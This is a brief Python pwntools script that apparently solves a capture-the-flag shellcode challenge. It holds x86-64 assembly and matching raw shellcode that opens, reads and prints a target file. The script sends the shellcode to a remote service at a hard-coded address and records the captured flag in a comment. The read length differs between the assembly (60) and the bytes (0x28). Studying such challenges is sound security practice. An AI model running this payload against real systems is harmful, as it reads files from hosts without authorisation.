from pwn import *

BIN = "./shellcode"

"""
bits 64

;;; OPEN

  mov rax, 2 ;sys_open
  call getfilename 
  db "PhaPhaKhongCoDon.txt",0 
getfilename:
  pop rdi 
  mov rsi, 0 
  mov rdx, 0 
  syscall 

;;; READ

  push rdi 
  push rax 

  mov rax, 0  ;sys_read
  pop rdi 
  pop rsi 
  mov rdx, 60 
  syscall 

;;; WRITE

  mov rax, 1 ; sys_write
  mov rdi, 1

  mov rdx, 60 
  syscall 
cat 
;;;nasm -o shellcode.bin shellcode.asm
"""
def exploit():
	payload=b"\xb8\x02\x00\x00\x00\xe8\x15\x00\x00\x00\x50\x68\x61\x50\x68\x61\x4b\x68\x6f\x6e\x67\x43\x6f\x44\x6f\x6e\x2e\x74\x78\x74\x00\x5f\xbe\x00\x00\x00\x00\xba\x00\x00\x00\x00\x0f\x05\x57\x50\xb8\x00\x00\x00\x00\x5f\x5e\xba\x28\x00\x00\x00\x0f\x05\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\xba\x28\x00\x00\x00\x0f\x05"
	print(io.recv(1024))
	io.sendline(payload)

	io.recv(1024)
	io.interactive()

#io = process(BIN)
io = remote("45.122.249.68", 10017)
exploit()
#Wanna.One{ve_so_sang_mua_chieu_xo_em_nghi_anh_la_ai_ma_sang_cua_chieu_do}